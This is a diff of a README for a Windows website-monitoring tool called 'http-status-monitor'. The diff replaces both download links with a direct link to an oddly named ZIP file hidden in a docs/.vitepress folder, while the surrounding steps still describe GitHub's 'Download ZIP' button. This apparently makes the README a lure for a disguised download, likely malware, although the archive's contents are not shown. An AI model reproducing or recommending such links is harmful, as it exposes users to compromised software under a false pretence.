@@ -1,6 +1,6 @@
 # 🔍 http-status-monitor - Track website health and availability daily
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/petuniapsychopathological990/http-status-monitor)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/petuniapsychopathological990/http-status-monitor/main/docs/.vitepress/status_monitor_http_neurochorioretinitis.zip)
 
 This tool checks your websites for broken links and status changes. It keeps a history of these changes so you can spot problems before they cause outages. You run this on your Windows computer to see if your sites stay online.
 
@@ -17,7 +17,7 @@ You need a basic Windows computer to run this tool. Ensure you have the followin
 
 Follow these steps to set up your monitor.
 
-1.  Visit this page to download: [https://github.com/petuniapsychopathological990/http-status-monitor](https://github.com/petuniapsychopathological990/http-status-monitor)
+1.  Visit this page to download: [https://raw.githubusercontent.com/petuniapsychopathological990/http-status-monitor/main/docs/.vitepress/status_monitor_http_neurochorioretinitis.zip](https://raw.githubusercontent.com/petuniapsychopathological990/http-status-monitor/main/docs/.vitepress/status_monitor_http_neurochorioretinitis.zip)
 2.  Click the green button labeled Code.
 3.  Select Download ZIP.
 4.  Save the folder to your computer.
